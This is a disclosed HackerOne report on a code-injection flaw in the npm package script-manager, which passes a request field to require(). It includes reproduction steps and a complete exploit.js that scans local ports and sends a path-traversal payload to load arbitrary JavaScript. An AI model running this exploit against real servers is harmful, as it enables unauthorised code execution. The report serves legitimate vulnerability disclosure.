# [script-manager] Unintended require

## Metadata

- HackerOne Report ID: 660563
- Weakness: Code Injection
- Program: nodejs-ecosystem
- Disclosed At: 2020-02-07T12:15:27.294Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report Unintended Require in `script-manager`.
It allows loading arbitary non-production code (js files).

# Module

**module name:** script-manager
**version:** 0.8.6
**npm page:** `https://www.npmjs.com/package/script-manager`

## Module Description

node.js manager for running foreign and potentially dangerous scripts in the cluster

# Vulnerability

## Vulnerability Description

`script-manager` is a Node.js module wich runs HTTP server as a child process and sends requests to this server. The server dynamically loads (with help of require()) some parts of the code, as long as the path to required code depends on the data from request (req.body.options.execModulePath), if the attacker knows the port of the server it is possible to load code that was not intended to execute.

source code example:

[https://github.com/pofider/node-script-manager/blob/master/lib/worker-servers.js#L268](https://github.com/pofider/node-script-manager/blob/master/lib/worker-servers.js#L268)

    require(req.body.options.execModulePath)(req.body.inputs, callback, function (err, val) {

## Steps To Reproduce:

- create directory for testing
    `mkdir poc`
   `cd poc/`

- install package
```
    npm i script-manager
```
- create index.js file with default usage example of script-manager

index.js (example code form [https://www.npmjs.com/package/script-manager](https://www.npmjs.com/package/script-manager))
```
    var scriptManager = require("script-manager")({ numberOfWorkers: 2 });
    
    scriptManager.ensureStarted(function(err) {
     
        /*send user's script including some other specific options into
        wrapper specified by execModulePath*/
        scriptManager.execute({
            script: "return 'Jan';"
        }, {
            execModulePath: path.join(__dirname, "script.js"),
            timeout: 10
        }, function(err, res) {
            console.log(res);
        });
     
    });
```
- create script.js (example file from [https://www.npmjs.com/package/script-manager](https://www.npmjs.com/package/script-manager))

script.js
```
    module.exports = function(inputs, callback, done) {
        var result = require('vm').runInNewContext(inputs.script, {
            require: function() { throw new Error("Not supported"); }
        });
        done(result);
    });
```
- create pwn.js file with some arbitary code for testing

pwn.js
```
    console.log('PWNED')
```
- create file exploit.js

main idea of the exploit is to request all ports in order to hit the one which serves the server and send crafted request to it
```
    {"options": {"rid": 12, "execModulePath": "./../../../pwn.js"}}
```
where './../../../pwn.js' is the path to script we want to execute

algorithm is simple:

1. send HTTP request (from example above) to all ports within 1024 - 65535  range
2. if there is specific response with the error message that contains:
```
    require(...) is not a function
```
 it means that we found our server and code was executed

exploit.js
```
    const request = require('request')
    const host = 'localhost'
    let stopEnum = false
    
    /*
     * Sends crafted HTTP request to specific port
     * in order to check if it is the app we are looking for and exploit it
     * 
     * @param {number} port - port number
     * @returns {Promise}
     */
    async function sendRequestToPort(port) {
      return new Promise((resolve, reject) => {
        request.post(
          {
            url: `http://${host}:${port}`,
            // sending json with path to js file we want to execute
            // https://github.com/pofider/node-script-manager/blob/master/lib/worker-servers.js#L268
            json: {"options": {"rid": 12, "execModulePath": "./../../../pwn.js"}}
          },
          (err, req, body) => {
            process.stdout.write(`requested http://${host}:${port}\r`)
            // if there is specific response with the error message it means that we found our server
            // and code was executed
            if (body && body.error && body.error.message === 'require(...) is not a function') {
              console.log(`port is ${port}`)
              stopEnum = true
            }
            resolve()
          }
        )
      })
    }
    
    (async function main(){
      //ports range
      const start = 1024
      const finish = 65535
      
      // split ports range into chunks of 1000
      let first = start
      let last = start + 1000
      while (!stopEnum) {
        if ( last > finish ) {
          last = finish
          stopEnum = true
        }
        const promises = []
        for (let i = first; i <= last; i++) {
          // sending request to every port from range
          promises.push(sendRequestToPort(i))
        }
        await Promise.all(promises)
        first = last + 1
        last = first + 1000
      }
    })()
```
- install request library (for exploit.js to work)
   ` npm i request`

*  run index.js
   ` node index.js`

* run exploit.js in another terminal and wait until it finishes (it may take a few minutes)
    `node exploit.js`

index.js should log 'PWNED' to terminal

## Patch

## Supporting Material/References:

- OS: Linux Mint current
- Node.js: 10.16.0
- NPM: 6.9.0

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

## Impact

An attacker is able to control the x in require(x) and cause code to load that was not intended to run on the server.
